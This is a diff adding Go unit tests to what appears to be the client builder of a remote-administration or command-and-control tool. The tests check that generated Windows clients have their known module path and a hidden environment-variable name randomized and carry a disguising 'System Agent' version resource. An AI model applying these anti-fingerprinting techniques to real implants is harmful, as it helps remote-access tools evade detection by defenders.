@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -167,4 +168,162 @@ func TestBuildClientRejectsInvalidArch(t *testing.T) {
 	if err != internal.ErrInvalidOSArch {
 		t.Errorf("BuildClient() error = %v, want %v", err, internal.ErrInvalidOSArch)
 	}
+}
+
+func TestRandomModulePath(t *testing.T) {
+	path := randomModulePath()
+
+	parts := strings.Split(path, "/")
+	if len(parts) != 3 || parts[0] != "github.com" {
+		t.Fatalf("randomModulePath() = %q, want a github.com/<owner>/<repo> path", path)
+	}
+	for _, part := range parts[1:] {
+		if part != strings.ToLower(part) || len(part) == 0 {
+			t.Errorf("randomModulePath() = %q, want lowercase non-empty path segments", path)
+		}
+	}
+
+	if path == randomModulePath() {
+		t.Error("randomModulePath() returned the same path twice")
+	}
+}
+
+func TestRandomEnvVarName(t *testing.T) {
+	name := randomEnvVarName()
+
+	if name == hiddenEnvVarName {
+		t.Errorf("randomEnvVarName() = %q, want a name different from %q", name, hiddenEnvVarName)
+	}
+	if !strings.Contains(name, "_") || name != strings.ToUpper(name) {
+		t.Errorf("randomEnvVarName() = %q, want an uppercase NAME_LOOKING variable", name)
+	}
+}
+
+func TestBuildVersion(t *testing.T) {
+	if got := buildVersion(" 2.1.0 "); got != "2.1.0" {
+		t.Errorf("buildVersion(%q) = %q, want %q", " 2.1.0 ", got, "2.1.0")
+	}
+
+	got := buildVersion("dev")
+	if got == "dev" || got == "" {
+		t.Errorf("buildVersion(%q) = %q, want a generated version", "dev", got)
+	}
+	if matched, _ := regexp.MatchString(`^[1-5]\.\d\.\d$`, got); !matched {
+		t.Errorf("buildVersion(%q) = %q, want a semantic version", "dev", got)
+	}
+}
+
+func TestAnonymizeRuntimeDirectory(t *testing.T) {
+	buildPath := t.TempDir()
+	mainFile := filepath.Join(buildPath, "app.go")
+	goModFile := filepath.Join(buildPath, "go.mod")
+
+	mainSource := `package main
+
+import "` + clientModulePath + `/app"
+
+const envVar = "` + hiddenEnvVarName + `"
+`
+	goModSource := "module " + clientModulePath + "\n\ngo 1.22.3\n"
+
+	if err := os.WriteFile(mainFile, []byte(mainSource), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(goModFile, []byte(goModSource), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(buildPath, "res_windows_amd64.syso"), []byte(clientModulePath), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	if err := anonymizeRuntimeDirectory(buildPath); err != nil {
+		t.Fatalf("anonymizeRuntimeDirectory() error = %v", err)
+	}
+
+	source, err := os.ReadFile(mainFile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(source), clientModulePath) {
+		t.Errorf("main.go still contains %q:\n%s", clientModulePath, source)
+	}
+	if strings.Contains(string(source), `"`+hiddenEnvVarName+`"`) {
+		t.Errorf("main.go still contains the %q environment variable:\n%s", hiddenEnvVarName, source)
+	}
+	if !strings.Contains(string(source), "github.com/") {
+		t.Errorf("main.go has no module import left:\n%s", source)
+	}
+
+	goMod, err := os.ReadFile(goModFile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(goMod), clientModulePath) {
+		t.Errorf("go.mod still contains %q:\n%s", clientModulePath, goMod)
+	}
+
+	extra, err := os.ReadFile(filepath.Join(buildPath, "res_windows_amd64.syso"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(extra) != clientModulePath {
+		t.Errorf("binary .syso was modified: %q", extra)
+	}
+}
+
+func TestBuildClientAnonymizesIdentifiers(t *testing.T) {
+	workingDir, err := os.Getwd()
+	if err != nil {
+		t.Fatal(err)
+	}
+	rootDir := filepath.Join(workingDir, "..", "..")
+	if err := os.Chdir(rootDir); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chdir(workingDir) })
+
+	service := NewClientService(
+		"dev",
+		&environment.Configuration{Server: environment.Server{Port: "8080"}},
+		nil,
+		fakeBuildAuthService{},
+	)
+
+	filename, err := service.BuildClient(BuildClientBinaryInput{
+		ServerAddress: "127.0.0.1",
+		ServerPort:    "8080",
+		OSTarget:      system.Windows,
+		Filename:      "chaosantest",
+	})
+	if err != nil {
+		t.Fatalf("BuildClient() error = %v", err)
+	}
+	t.Cleanup(func() { _ = os.Remove(filepath.Join("temp", filename)) })
+
+	output, err := os.ReadFile(filepath.Join("temp", filename))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(output) < 2 || string(output[:2]) != "MZ" {
+		t.Fatalf("built client is not a PE file, got %x", output[:2])
+	}
+	if bytes.Contains(output, []byte(clientModulePath)) {
+		t.Errorf("built client contains the well-known module path %q", clientModulePath)
+	}
+	if bytes.Contains(output, []byte(hiddenEnvVarName)) {
+		t.Errorf("built client still contains the %q environment variable", hiddenEnvVarName)
+	}
+	utf16VersionInfo := utf16LE("System Agent")
+	if !bytes.Contains(output, utf16VersionInfo) {
+		t.Error("built client has no version resource")
+	}
+}
+
+// utf16LE encodes a string the way the Windows resource section stores it.
+func utf16LE(value string) []byte {
+	encoded := make([]byte, 0, len(value)*2)
+	for _, r := range value {
+		encoded = append(encoded, byte(r), byte(r>>8))
+	}
+	return encoded
 }
